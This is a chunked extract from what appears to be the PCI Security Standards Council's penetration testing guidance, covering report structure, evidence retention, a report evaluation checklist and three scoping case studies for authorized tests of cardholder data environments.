    "text": "of penetration testing providers and the desires of customers. 5.2.1 Penetration Test Report Outline  Executive Summary Brief high-level summary of the penetration test scope and major findings o  Statement of Scope A detailed definition of the scope of the network and systems tested as part of o the engagement Clarification of CDE vs. non-CDE systems or segments that are considered during the test o Identification of critical systems in or out of the CDE and explanation of why they are o included in the test as targets  Statement of Methodology Details on the methodologies used to complete the testing (port scanning, nmap etc.). o See Section 4 for details on methodologies that should be documented.  Statement of Limitations Document any restrictions imposed on testing such as designated testing hours, o bandwidth restrictions, special testing requirements for legacy systems, etc. The intent of this document is to provide supplemental information. Information provided here does not 22\\n Testing Narrative Provide details as to the testing methodology and how testing progressed. For example, if o the environment did not have any active services, explain what testing was performed to verify restricted access. Document any issues encountered during testing (e.g., interference was encountered o as a result of active protection systems blocking traffic).  Segmentation Test Results Summarize the testing performed to validate segmentation controls, if used to reduce o the scope of PCI DSS.  Findings Whether/how the CDE may be exploited using each vulnerability. o Risk ranking/severity of each vulnerability o Targets affected o References (if available) o CVE, CWE, BID, OSBDB, etc. - Vendor and/or researcher - Description of finding o  Tools Used  Cleaning up the Environment Post-Penetration Test After testing there may be tasks the tester or customer needs to perform to restore the target environment (i.e., update/removal of test accounts or database entries added or modified during testing, uninstall of test tools or other artifacts, restoring active protection-system settings, and/or other activities the tester may not have permissions to perform, etc.). Provide directions on how cleanup should be performed and how to verify security o controls have been restored. 5.2.2 Retesting Considerations and Report Outline If the noted findings will require remediation and retesting before an assessor can determine the entity has met PCI DSS Requirement 11.3, a follow-up test report may be provided. All remediation efforts should be completed and retested within a reasonable period of time after the original penetration test report was provided. It is expected that the remediation test report will cover all identified/exploitable vulnerabilities that require remediation. Those identified vulnerabilities is may be medium or high for external penetration tests and those defined by the organization as medium or high for internal tests. The intent of this document is to provide supplemental information. Information provided here does not 23\\nThe following is an example of the sections to include in a retest report as defined in Section 5.2.1:  Executive Summary  Date of Original Test  Date of",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 18
    }
  },
  {
    "text": "or high for internal tests. The intent of this document is to provide supplemental information. Information provided here does not 23\\nThe following is an example of the sections to include in a retest report as defined in Section 5.2.1:  Executive Summary  Date of Original Test  Date of Retest  Original Findings  Results of Retest 5.3 Evidence retention 5.3.1 What is considered evidence? A typical penetration test involves obtaining and evaluating evidence using a formal methodology; evidence collected from the penetration test is used to determine the conclusion. Evidence is considered all information that supports the penetration tester’s conclusions about the effectiveness of the security controls and the environment’s overall security posture. The penetration tester should follow a systematic process to securely collect, handle, and store evidence. Examples of evidence include but are not limited to screenshots, raw tool output (i.e., NMAP, burp suite, Nessus, TCPDump Wireshark, etc.), acquired dumps in case of exploitation (i.e., database files, logs, configuration files etc.), photos, recordings, and anything that may support the final conclusion of the penetration test report. It should be noted that if cardholder data is acquired during the penetration test, it is recommended that it be kept to a minimum. For example, a database full of cardholder data should not be dumped to the tester’s machine or system. 5.3.2 Retention It is recommended that procedures for retention and destruction of evidence be documented for all parties involved prior to commencing the penetration test. If a third party is used to perform the penetration test, contract language should be reviewed to confirm these procedures are clear. While there are currently no PCI DSS requirements regarding the retention of evidence collected by the penetration tester, it is a recommended best practice that such evidence be retained by the tester (whether internal to the organization or a third-party provider) for a period of time while considering any local, regional, or company laws that must be followed for the retention of evidence. This evidence should be available upon request from the target entity or other authorized entities as defined in the rules of engagement. If, however, a tester stores cardholder data obtained during the engagement, the data must be stored by the tester following the guidelines of the PCI DSS for the storage of account data—i.e., encrypted using strong cryptography, truncated/hashed, or not stored. Storage of account data by the tester is not recommended. This data should be securely wiped from tester systems at the conclusion of the engagement. The intent of this document is to provide supplemental information. Information provided here does not 24\\n5.4 Penetration Test Report Evaluation Tool This section is intended for entities that receive a penetration test report and need to interpret and evaluate the completeness of the report. The intent is to provide a tool that could be used by merchants, service providers, and assessors to quickly determine the depth of testing and quality of the reporting based upon the contractual agreement between the organization and",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 19
    }
  },
  {
    "text": "report and need to interpret and evaluate the completeness of the report. The intent is to provide a tool that could be used by merchants, service providers, and assessors to quickly determine the depth of testing and quality of the reporting based upon the contractual agreement between the organization and the tester. It should be noted that this checklist is not intended to take the place of thorough report inspection, interpretation of the findings, and taking appropriate action. Table 1 details the questions, a place to record whether the item is included in the report and the page number where it is found. It is not the intent to generate any type of “score” from the results, as its intent is to provide a communication tool that may be used between the entity and the tester after a report has been written and the results evaluated. It should be noted that these items represent a suggested minimum set of items to look for in the report; additional content may be present. Table 1: Report Evaluation Checklist Included In Report Report Question Page Yes No Penetration Tester Name/Organization ☐ ☐ Contact information ☐ ☐ Credentials/qualifications of analysts Is there sufficient evidence that the individuals are organizationally ☐ ☐ independent from the management of the environment being tested? ☐ ☐ Dates the engagement was performed ☐ ☐ Date the report was issued Executive Summary ☐ ☐ Summarizes testing performed ☐ ☐ Summarizes results of testing ☐ ☐ Summarizes steps for remediation Scope ☐ ☐ Is the scope clearly documented? ☐ ☐ How the scope was determined Is the attack perspective of the engagement clearly defined (internal, external, ☐ ☐ or both)? The intent of this document is to provide supplemental information. Information provided here does not 25\\nIncluded In Report Report Question Page Yes No Is the type of testing clearly defined (application layer, network layer, or both)? ☐ ☐ Were there any constraints put on the testing (time, bandwidth limitations, ☐ ☐ etc.)? Methodology ☐ ☐ Is the methodology clearly stated? Does the methodology reflect industry best practices (OWASP, NIST, etc.)? ☐ ☐ Narrative Is there a clear discussion of the automated and manual testing that was ☐ ☐ performed? Is there clear documentation of any problems that were encountered during ☐ ☐ the testing (interference from active protection systems, target environment controls blocking or dropping packets, etc.)? Discovery Is there a section that documents all identified open network ports/services for ☐ ☐ the target scope and the originating perspective (external or internal exposure)? Results Is there a clear indication whether retesting is needed, and if so, what specific ☐ ☐ areas require retesting? Is there a summary listing of items that need remediation and retesting? ☐ ☐ Is there a detailed listing of items that need remediation and retesting? ☐ ☐ Did tester demonstrate attempts to exploit the identified vulnerability and ☐ ☐ clearly state the potential result/risk that each potential exploit may pose to the environment? (See Section 5.1.1 for",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 20
    }
  },
  {
    "text": "need remediation and retesting? ☐ ☐ Is there a detailed listing of items that need remediation and retesting? ☐ ☐ Did tester demonstrate attempts to exploit the identified vulnerability and ☐ ☐ clearly state the potential result/risk that each potential exploit may pose to the environment? (See Section 5.1.1 for risk-ranking discussion.) The intent of this document is to provide supplemental information. Information provided here does not 26\\n6 Case Studies / Scoping Examples This section provides a number of case studies that illustrate various concepts and methodologies covered in this document. 6.1 E-commerce Penetration Test Case Study Case Introduction The Client is a level-one merchant and retailer of women’s clothing. Client has three unique brands running on multiple e-commerce web sites. Brand A runs on a third-party e-commerce platform written using a Java platform with Apache Tomcat and IBM’s DB2 database and utilizes a content-delivery network for image distribution. Brand B and Brand C utilize an in-house coded e-commerce shopping cart written in ColdFusion with Microsoft SQL and share the same underlying code. All brands submit cardholder data for processing over HTTPS. All sites are hosted at a third-party hosting provider on dedicated systems. The Client’s firewalls have integrated intrusion prevention features. Client has exclusive control of the code and the content. Product Managers update product information using staging servers in the corporate environment, and the updates are promoted to production by IT support staff. Client has full control of DNS. Description of Environment The environment for Brands A, B, and C is comprised of five networks. The web DMZ contains the firewalls, DNS servers, load balancers, and web servers for all brands. Only the load balancers are NAT’d and have publicly routable IP addresses. The application tier contains the Apache Tomcat and ColdFusion middleware servers. It is segmented from the DMZ and database tiers using firewall access controls. The database tier contains the Microsoft SQL and IBM DB2 servers. It is segmented from the application tier using firewall access controls. The management network is used for backups, patch-management servers, NTP Servers, network-traffic analysis devices, and syslog collectors. The management network is accessible using jump boxes with two-factor authentication from the corporate network over a point-to-point VPN. Pre-Engagement Activities (Planning) Once the engagement is confirmed, the Pen Test Company scheduled a kick-off call and provided the Client with a testing questionnaire and test-authorization form to be completed before the next meeting. The kick-off call is generally used to review the rules of engagement, define the success criteria, and review the methodology to be used. An examination of this type could be conducted in accordance with information system security assessment best practices such as described by the Open Source Security Testing Methodology Manual (“OSSTMM”), The National Institute of Standards and Technology (“NIST”) Special Publication 800-115, Technical Guide to Information Security Testing and Assessment, or the Open Web Application Security Project (OWASP) testing methodology as defined in the OWASP Testing Guide v.3.0. The intent of this document is to provide supplemental information.",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 21
    }
  },
  {
    "text": "Methodology Manual (“OSSTMM”), The National Institute of Standards and Technology (“NIST”) Special Publication 800-115, Technical Guide to Information Security Testing and Assessment, or the Open Web Application Security Project (OWASP) testing methodology as defined in the OWASP Testing Guide v.3.0. The intent of this document is to provide supplemental information. Information provided here does not 27\\nScoping is critical, and the more complex the environment, the more difficult it becomes. In this case, all external IPs used for the DMZ and web tier were included in the scope. This would include all systems that directly store, process, or transmit cardholder data. Because the Client has full control and full responsibility for its security, the DNS server was included in the scope of the test to determine whether an attacker could compromise the server and redirect traffic intended for the Client’s sites to a malicious intermediary or fraudulent site. The image CDN servers were determined out of scope because no PAN data is transmitted or processed and the systems are otherwise fully segmented. The staging systems are unavailable from the Internet and therefore cannot be tested. The web applications for Brand A and Brand B will be completely in scope. The web application for Brand C is presumed to be an exact copy, exclusive of product information and look and feel. The tester will sample the web application for Brand C to verify that the applications are the same as Brand B. If it is determined that there are material differences between Brand B and Brand C web applications, Brand C will be brought fully into scope. The Client and Pen Test Company have agreed that testing will be conducted against the production systems, as no suitable staging or review system is publicly available. Because of this limitation, testing must be performed with the intrusion prevention system enabled. However, because the timeline for testing cannot accommodate the time required to use techniques that might bypass the IPS, the Client has agreed to remove any blocks enabled by the system during testing. For this engagement the Client has requested that additional rules of engagement include that testing be limited to non-peak hours, and any attempts to run exploit code on the remote systems be performed only after notifying the Client. Also, any accounts created by the tester or successful orders placed in the system must be identified at the end of each day’s testing. All parties have agreed that no further testing is required if the penetration tester is able to extract data from either of the databases or obtain shell access on any server in the web farm. Engagement Phase (Discovery and Attack/Execution) The penetration tester began by comparing the scope provided by the Client with the latest ASV report to ensure they agreed on the assets and targets under examination. Any differences in scope were noted and investigated. The penetration tester then gathered information on the target organization through web sites and mail servers, public records, and databases. This open-source intelligence",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 22
    }
  },
  {
    "text": "by the Client with the latest ASV report to ensure they agreed on the assets and targets under examination. Any differences in scope were noted and investigated. The penetration tester then gathered information on the target organization through web sites and mail servers, public records, and databases. This open-source intelligence (OSINT) gathering is an important next step in confirming scope and determining that all the appropriate assets have been included in the test. Newly discovered assets were vetted by the Client to determine whether they should be included in the penetration test. During this phase of the assessment, an additional disaster recovery site was identified in DNS, and Client confirmed this to be a warm backup in the event of failure of the primary sites. All relevant assets were added to the scope. The intent of this document is to provide supplemental information. Information provided here does not 28\\nOnce the assets were confirmed, the penetration tester enumerated the publicly available services provided by the targets. The tester actively tried to obtain usernames, network-share information, and application- version information of all running services and applications. In this phase, the penetration tester began to spider and map the applications, with and without credentials, in preparation for the exploitation phase. The tester was provided with the ability to complete a full transaction all the way through checkout and order confirmation. With target enumeration complete, the tester performed vulnerability mapping of identified services using automated tools and by comparing the port and service fingerprint against well-known vulnerability databases. This produced a list of unconfirmed vulnerabilities that were further examined in the exploitation phase of testing. The exploitation phase included tests and techniques designed to meet the objectives of the test. (These must be exploitive and may also be used to confirm the effectiveness of ancillary security controls such as intrusion detection systems or web application firewalls.) It was during this step that testing of the applications for issues related to the OWASP Top 10 and other web application frameworks took place. The final phase of testing included post-exploitation techniques. The term “post-exploitation” refers to the actions taken after the initial compromise of a system or device. It often describes the methodical approach of using privilege escalation techniques to gain additional access to systems or network resources. The extent to which post-exploitation techniques were performed were defined prior to the start of test to prevent the tester from putting production systems at risk of destabilization. Main vulnerabilities identified were: High:  Apache Tomcat Manager Application Deployer Authenticated Code Execution  Cross-site scripting (reflective)  Directory traversal Medium:  Deprecated protocols - SSLv2, SSLv3  SSL weak ciphers  Internal IP address disclosure Low:  IPS not enabled for disaster-recovery site  Slow HTTP denial-of-service attack Post-Engagement (Post-Execution Phase) At the completion of this examination, the penetration tester met with the Client to describe the preliminary results of the test and address any immediate concerns in advance of the report. The post-execution phase focused on analyzing",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 23
    }
  },
  {
    "text": "not enabled for disaster-recovery site  Slow HTTP denial-of-service attack Post-Engagement (Post-Execution Phase) At the completion of this examination, the penetration tester met with the Client to describe the preliminary results of the test and address any immediate concerns in advance of the report. The post-execution phase focused on analyzing the identified vulnerabilities to determine root causes, establish recommendations and/or remediation activities, and develop a final report where all vulnerabilities noted during the test were documented even though the vulnerabilities did not have an impact on the cardholder data environment. The intent of this document is to provide supplemental information. Information provided here does not 29\\nThe penetration test report was presented to the Client and it was discussed how the Client could remediate the vulnerabilities noted during the penetration test. It was noted that the denial-of-service attack and missing IPS, while serious issues for a retailer, were not PCI-relevant findings and would not be required in order to obtain a clean report. The Client corrected all High and Medium-severity vulnerabilities within a 90-day window and the Pen Test Company provided documentation of successful remediation to the Client. 6.2 Hosting Provider Penetration Test Case Study Case Introduction PCIData Hosting is a hosting service provider. The only cardholder data environment that exists within PCIData Hosting belongs to its PCI DSS compliant customer, TechMerchant. TechMerchant is operating an e-commerce web environment on the PCIData hosting hardware. TechMerchant is solely responsible for the administration and maintenance of all the software and applications used to support its e-commerce environment. PCIData Hosting is bound by contract with TechMerchant to maintain PCI Compliance. PCIData Hosting is required to maintain PCI Compliance by TechMerchant since PCIData Hosting provides critical security services to TechMerchant for its PCI DSS compliance. In addition, PCIData Hosting has a wish to extend this type of PCI DSS hosting service to more customers in the payment card industry. PCIData Hosting is managing the systems in the cardholder data environment and is responsible for physical security, hardware, network, firewalls, and OS including updates, configuration etc. Applications and databases are not the responsibility of PCIData Hosting. Storing, processing, and transmitting cardholder data are in TechMerchant’s scope and have been described and assessed in its own PCI DSS Assessment. PCIData Hosting has no type of cardholder data transactions in scope, and the only entity hosted from a PCI perspective is TechMerchant, for whom they only provide hardware hosting services and logical system management. Description of Environment The environment at PCIData Hosting consists of five different networks:  ODIN Network Zone: Only VMware Hypervisors used for the TechMerchant CDE servers and environment are hosted in this network segment. This network is not accessible from the THOR network.  THOR Network Zone: This network is the CDE environment where TechMerchant has its virtual servers located; all servers located at this network are in PCI scope. The network is separated into smaller networks: DMZ, secure database zone, and an application zone. These networks are included in the penetration test performed",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 24
    }
  },
  {
    "text": "THOR Network Zone: This network is the CDE environment where TechMerchant has its virtual servers located; all servers located at this network are in PCI scope. The network is separated into smaller networks: DMZ, secure database zone, and an application zone. These networks are included in the penetration test performed at TechMerchant.  LOKE Network Zone: Guest network used for external consultants, other guests, BYOD devices, etc. This is the only network that has wireless access points connected. The intent of this document is to provide supplemental information. Information provided here does not 30\\n HEJMDAL Network Zone: Management network from which PCIData Hosting manages the different client networks that do not fall into PCI scope. This network is only used to manage non- CDE servers.  BALDER: All other clients are hosted on this network, including PCIData Hosting’s own office network. All networks are separated by firewalls, and access to ODIN and THOR network segments is restricted to two-factor authentication. The only wireless network is connected to LOKE (the guest network). The datacenter is located at PCIData Hosting’s location and is also in scope for PCI compliance. High-Level Network Diagram Success Criteria – The success criteria for the penetration test is to gain access to the CDE. Resource List (CDE environment)  ODIN – VMware servers  THOR – UNIX-based servers including webservers; Oracle databases in a secure zone  All employees at PCIData Hosting use Microsoft-based workstations to access the CDE environment. Pre-Engagement Actives (Planning) The methodology used for the penetration test was based on NIST SP800-115; the penetration test included the following phases: Planning, Discovery, Attack/Execution, Post-Execution and Reporting. The intent of this document is to provide supplemental information. Information provided here does not 31\\nThe planning phase was used to gather information needed for the assessment execution—such as the assets to be assessed, the threats of interest against the assets, and the security controls to be used to mitigate those threats—and to develop the assessment approach. The networks ODIN (VMware) and THOR (CDE Servers) are the targets of the penetration test as these servers are those that store, process, and transmit cardholder data. Scoping Discussion It was discussed with PCIData Hosting how they managed their CDE environment, including servers and databases. The operating systems are administrated by PCIData Hosting; all applications and development are handled by TechMerchant. Both PCIData Hosting and TechMerchant administer databases. Encrypted information in the database is only accessible with the encryption keys that are held by TechMerchant. All access to ODIN and THOR are authenticated by a two-factor solution. This also applies when accessed from internal networks at PCIData Hosting. TechMerchant’s last penetration test was reviewed to make sure that all perimeters, servers, etc. were covered by the tests. The application was tested as a part of the TechMerchant’s annual PCI penetration test and is not considered in scope for PCIData Hosting’s PCI penetration test, therefore the focus is network- layer testing. The following documentation was reviewed before the assessment:  A network diagram",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 25
    }
  },
  {
    "text": "were covered by the tests. The application was tested as a part of the TechMerchant’s annual PCI penetration test and is not considered in scope for PCIData Hosting’s PCI penetration test, therefore the focus is network- layer testing. The following documentation was reviewed before the assessment:  A network diagram  Results from quarterly external and internal vulnerability scans  Results from the last penetration test  The scope of the TechMerchant’s last penetration test  Security policies  Review of PCIData Hosting’s risk analysis. The following tests were performed during the assessment:  Internal penetration tests from LOKE (guest network), HEJMDAL (management network) and from the office network located in BALDER (Client).  Social engineering against PCIData Hosting administrators of ODIN (VMware) and THOR (CDE servers) in form of phishing e-mails  Physical security assessment as a part of the penetration test.  External testing of PCIData Hosting of their external IP-addresses. All servers, databases, employees with access to the CDE, etc. are considered in scope for the penetration test. The intent of this document is to provide supplemental information. Information provided here does not 32\\nPre-Test Preparations A user account was created for the penetration tester following the regular procedures for granting access to new employees. Access credentials for the guest network were also granted to the tester. Engagement Phase (Discovery and Attack/Execution) Discovery was performed on the LOKE (guest), HEJMDAL (management) and BALDER (office) networks to identify targets (servers, network components, workstations, etc.) on the networks, and analyzing techniques were used to get an understanding of the environment. The objectives of this phase were to identify systems, ports, services, and potential vulnerabilities. This phase was performed both manually and via automated tools including network discovery and port and service detection. When enough data was collected in the discovery phase, the penetration tester tried to gain access to the targets discovered. When access was gained to targets the tester tried to escalate privileges in order to gain complete control of the target. The access obtained was then used to gain more information about the environment, and a new discovery phase was started. The primary goal for the discovery and attack/execution was gaining access to the CDE, including the VMware hosts. The techniques used included password cracking, vulnerability scanning, social engineering, and network-layer testing. The above was completed for the following different perspectives during the assessment:  External attacker without knowledge of the environment  Internal attacker (guest, contractor, etc.)  Internal attacker (employee without access to the CDE) The following tests were performed during the assessment:  External attacker without knowledge of the environment External VPN connection was tested. o Phishing e-mails were sent to carefully selected victims who all are working with administrating o the CDE environment. Attempts to gain access to the data center without having notified the data center up front. o Vulnerabilities related to the VPN connection were not found during the external test. Phishing e- mails were sent but the exploits were caught by",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 26
    }
  },
  {
    "text": "all are working with administrating o the CDE environment. Attempts to gain access to the data center without having notified the data center up front. o Vulnerabilities related to the VPN connection were not found during the external test. Phishing e- mails were sent but the exploits were caught by PCIData Hosting’s anti-virus installation. It was not possible to obtain access to the data center without first being authorized by PCIData Hosting.  Internal attacker Attacks from guest network were performed o Attacks from the management network were performed o Attacks from the office network were performed o The intent of this document is to provide supplemental information. Information provided here does not 33\\nVulnerabilities were found on the different networks, and the tester was able to exploit these but was not able to use the vulnerabilities to gain access to ODIN or THOR. Main vulnerabilities identified were:  Man in the middle – It was possible to perform a man-in-the-middle attack using ARP poisoning but the tester was not able to extract any sensitive information that could provide information on how to gain access to ODIN or THOR.  Weak password policy implemented – Weak password settings on local servers on the BALDER network were used to compromise accounts on this network. The tester was not able to use these accounts to gain access to ODIN or THOR. As these servers are not in PCI scope, the weak password policy was not considered to have an impact on compliance.  Old user accounts were compromised – The tester was able to compromise user accounts that were created but had never been in use on the BALDER network. The compromised accounts did not grant access to ODIN or THOR.  Others – Other vulnerabilities were noted as zone transfer, outdated software, unencrypted protocols used; these vulnerabilities were all related to LOKE or BALDER network and did not grant access to ODIN or THOR even when exploited. Post-Engagement (Post-Execution phase) The post-execution phase focused on analyzing the identified vulnerabilities to determine root causes, establish recommendations and/or remediation activities, and develop a final report where all vulnerabilities noted during the test were documented even though they did not have an impact on the cardholder data environment. The penetration test report was presented to the Client and it was discussed how the Client could remediate the vulnerabilities noted during the penetration test. It was confirmed that none of the vulnerabilities had an effect on the cardholder data environment. As no significant vulnerabilities related to the CDE environment were discovered and access to the CDE environment was not obtained, remediation testing was not performed. The intent of this document is to provide supplemental information. Information provided here does not 34\\n6.3 Retail Merchant Penetration Test Case Study Case Introduction In this example, the business is a retail clothing company called Green Clothing. Cardholder data is collected as a card-present transaction by swiping or keying the card into a POS terminal. The information is then sent to",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 27
    }
  },
  {
    "text": "provided here does not 34\\n6.3 Retail Merchant Penetration Test Case Study Case Introduction In this example, the business is a retail clothing company called Green Clothing. Cardholder data is collected as a card-present transaction by swiping or keying the card into a POS terminal. The information is then sent to a local server at each store before being sent out to the processor. No cardholder data is transmitted between stores or back to corporate. After receiving a confirmation from the processor, cardholder data is purged from the POS server. The POS server runs a PA-DSS point-of-sale application. Corporate has a persistent VPN connection into each of the store locations to allow for administration of networked resources, accessing CCTV recordings, and checking inventory. Description of Environment The environment at Green Clothing consists of six store locations and one corporate office. All stores were determined to be identically configured and have been segmented into two networks:  POS Network – Cardholder Data Environment (CDE) 2 POS devices o 1 POS server o  General Store Network (Non-CDE) 1 manager workstation o 1 CCTV server o Corporate is made up of two network segments:  Corporate General User Network (Non-CDE) 4 workstations o 1 wireless access point o  Corporate IT Management Network (Non-CDE) o 3 workstations used to manage CDE servers The intent of this document is to provide supplemental information. Information provided here does not 35\\nDescription of Access The table below outlines the access from all non-CDE networks into the CDE. This access definition will help in determining what types of testing should be conducted and from where. Source Network (Non CDE) Destination Network (CDE) Access Corporate General User Network Store POS Network None – Segmented Corporate IT Management Network Store POS Network SSH to POS server Store General Network Store POS Network None – Segmented Example Store Network Diagram The intent of this document is to provide supplemental information. Information provided here does not 36\\nExample Corporate Network Diagram Pre-Engagement Activities The POS networks at each store location are considered the cardholder data environment and are the target of the penetration test. The servers within this network at each store are the servers that store, process, and transmit cardholder data. Scoping Discussion It was discussed with Green Clothing company how they managed their CDE-environment, specifically how servers and databases are administrated. All administration is conducted from the IT network at corporate over the VPN connection. The following documentation was reviewed before the assessment:  A network diagram  Results from quarterly external and internal vulnerability scans  Results from the last penetration test  The scope of the Green Clothing’s last penetration test  Security policies  Review of Green Clothing’s risk analysis The intent of this document is to provide supplemental information. Information provided here does not 37\\nFinal Scope Definition After review of all provided materials, Green Clothing and the penetration tester came to an agreement of the following scope definition. External Penetration Test Testing included evaluation of the following",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 28
    }
  },
  {
    "text": "risk analysis The intent of this document is to provide supplemental information. Information provided here does not 37\\nFinal Scope Definition After review of all provided materials, Green Clothing and the penetration tester came to an agreement of the following scope definition. External Penetration Test Testing included evaluation of the following Internet-facing resources:  Six store public IPs Internal Penetration Testing Based on information that all stores are configured identically, internal testing was performed against two stores. Any vulnerabilities identified are assumed to exist in all stores. Testing included evaluation of the following unique testing perspectives targeting two store POS networks: Table x: Network-layer penetration testing scope Perspective network Targeted Network Corporate IT Network Store # 1 – POS Network Corporate IT Network Store # 2 – POS Network Table y: Segmentation testing scope Perspective network Targeted Network Corporate general user network Store # 1 – POS Network Store 1 – general network Store # 1 – POS Network Corporate general user network Store # 2 – POS Network Store 2 – general network Store # 2 – POS Network Pre-Test Preparations The penetration tester was given a network level access in each of the defined testing perspectives.  Corporate IT Network  Corporate General User Network  Store 1 General Network  Store 2 General Network The penetration tester was also provided with the internal IP information for the POS network at the sample target store. No other network access or user credentials were provided. The intent of this document is to provide supplemental information. Information provided here does not 38\\nEngagement Phase The success criteria for the penetration test were defined as getting access to the CDE environment and accessing cardholder data. Based on the defined scope, the following different attack scenarios were evaluated:  External attacker without knowledge of the environment  Internal attacker with no CDE access (guest, contractor, etc.) in either the store general network, or the corporate general network  Internal attacker gaining unauthorized access to the corporate IT management network segment and pivoting to attack stores as an administrator Reporting Phase The penetration tester reported the following items after completing the test. External Penetration Test No notable items reported. It was determined that the only publicly reachable services were the VPN connection points, which were vetted and determined to be secure. Internal Penetration Test Outlined below are the vulnerabilities identified during the internal penetration test.  Vulnerability #1 – Segmentation failure Summary: It was found that firewall #2 (CDE firewall) was configured to allow unrestricted access (all ports and services) from the store General Network (10.0.0.0/24) into the store POS Network (192.168.0.0/24).  Vulnerability #2 – Default user credentials on POS server Summary: Default credentials were enabled on the third-party application running on the POS server. Using these credentials, the penetration tester was able to obtain administrative-level access to the POS server. Post-Engagement Green Clothing reviewed the penetration test report and implemented fixes for each identified item. The penetration tester conducted additional testing to validate",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 29
    }
  },
  {
    "text": "were enabled on the third-party application running on the POS server. Using these credentials, the penetration tester was able to obtain administrative-level access to the POS server. Post-Engagement Green Clothing reviewed the penetration test report and implemented fixes for each identified item. The penetration tester conducted additional testing to validate that the remediation activities sufficiently resolved the reported items. An updated report was provided that showed the items as remediated. The intent of this document is to provide supplemental information. Information provided here does not 39\\nAppendix A: Quick-Reference Table to Guidance on PCI DSS Penetration Testing Requirements Informational Supplement Section(s) PCI DSS 11.3.x Requirement Containing Guidance 11.3 Penetration test methodology sub-bullets: Based on industry-accepted approaches 3.1, 4.4, 5.1.1, 5.1.2, 5.2 - Coverage for CDE and critical systems 2.2, 2.2.4, 4.1.1 - Includes external and internal testing 2.2.1, 2.2.2 - Test to validate segmentation controls 2.2.3, 4.2.3 - Application-layer testing 2.3, 4.2.1 - Network-layer tests for network and OS 2.3, 4.2.2 - The intent of this document is to provide supplemental information. Information provided here does not 40\\nAcknowledgements PCI SSC would like to acknowledge the contribution of the Penetration Testing Guidance Special Interest Group (SIG) in the preparation of the original document published in 2015. The Penetration Testing Guidance SIG consisted of representatives from the following organizations: Accuvant, Inc Convergys Corp Agio, LLC CradlePoint Alaska Airlines Crosskey Banking Solutions A-lign Security and Compliance Services Crowe Horwath LLP Allstate Insurance DataFlight Europe AS Aperia Solutions Delhaize America Shared Services Group, LLC AT&T Consulting Solutions Dell, Inc. atsec (Beijing) Information Technology Co., Ltd Deluxe Corp. Bally Total Fitness Diamond Resorts Corp. Bank Of New Zealand Digital Defense, Inc. Bashas' Inc. Domino's Pizza, Inc. BB&T Corporation DST Output Board of Trustees of the University of Arkansas Enterprise Holdings, Inc. Bridge Point Communications EVO Payments International The Brick Group EVRY A/S BrightLine CPAs & Associates, Inc. Experian Information Services British Airways PLC Exxon Mobil Corporation BT PLC Fiscal Systems, Inc. Canadian Tire Financial Services Fiserv Solutions, Inc. CBIZ Security & Advisory Services, LLC FishNet Security CDG Commerce Foregenix CenturyLink Foresight IT Consulting Pty Ltd. Cisco Systems, Inc. FortConsult A-S Citigroup Inc. Games Workshop Ltd Clydesdale Bank PLC Gap Inc. Coalfire Systems, Inc. Global Payments Direct, Inc. Compass IT Compliance, LLC Grant Thornton Computer Services, Inc. Groupement Interbancaire Monetique de Comsec L'uemoa (GIM-UEMOA) ControlScan Inc. GuidePoint Security, LLC The intent of this document is to provide supplemental information. Information provided here does not 41\\nHewlett-Packard SecurityMetrics, Inc. Hitachi-Omron Terminal Solutions, Corp. Sense of Security Pty Ltd. IBM Corporation Sikich LLP Internet Security Auditors SISA IQ Information Quality SIX Payment Services Ltd Isis Mobile Commerce Solutionary, Inc. Jet Infosystems Starwood Hotels & Resorts Worldwide, Inc. Liverpool Victoria Friendly Society State Farm Mutual Automobile Insurance Company Lloyds Banking Group StoreFinancial Services MegaPath Inc. Structured Communication Systems, Inc. MobileIron, Inc. Sword & Shield Enterprise Security, Inc. Módulo Security Solutions S.A. Symantec Corporation MTI Technology, Ltd. Sysnet Limited National Australia Bank Telstra Nettitude, Ltd. Tesco Stores Ltd. NIC Inc Tieto Latvia",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 30
    }
  },
  {
    "text": "Society State Farm Mutual Automobile Insurance Company Lloyds Banking Group StoreFinancial Services MegaPath Inc. Structured Communication Systems, Inc. MobileIron, Inc. Sword & Shield Enterprise Security, Inc. Módulo Security Solutions S.A. Symantec Corporation MTI Technology, Ltd. Sysnet Limited National Australia Bank Telstra Nettitude, Ltd. Tesco Stores Ltd. NIC Inc Tieto Latvia SIA Novacoast TIVIT (Terceirizacao de Tecnologiae Servicios S/A) NRI Secure Technologies Trustwave Holdings, Inc. NTA Monitor Ltd. TSYS NTT Security Ltd. TUI Travel PLC Online Enterprises U.S. Bancorp Outerwall U.S. Cellular Payment Software Company (PSC) UL Transaction Security PTY Ltd. PayPal, Inc. University of Oklahoma Pier1 Imports UPS (United Parcel Service) Princeton Payment Solutions LLC usd AG Progressive Casualty Insurance Company Verizon Wireless Promocion y Operacion SA de CV VigiTrust Ltd. Rapid7 LLC Vodat International Ltd. RBC Royal Bank The Walt Disney Company RBS Westpac Banking Corporation Right Time Limited Xpient Solutions LLC Secured Net Solutions Inc. SecureNet The intent of this document is to provide supplemental information. Information provided here does not 42\\nAbout the PCI Security Standards Council The PCI Security Standards Council is an open global forum that is responsible for the development, management, education, and awareness of the PCI Data Security Standard (PCI DSS) and other standards that increase payment data security. Created in 2006 by the founding payment card brands American Express, Discover Financial Services, JCB International, Mastercard, and Visa Inc., the Council has more than 700 Participating Organizations representing merchants, banks, processors, 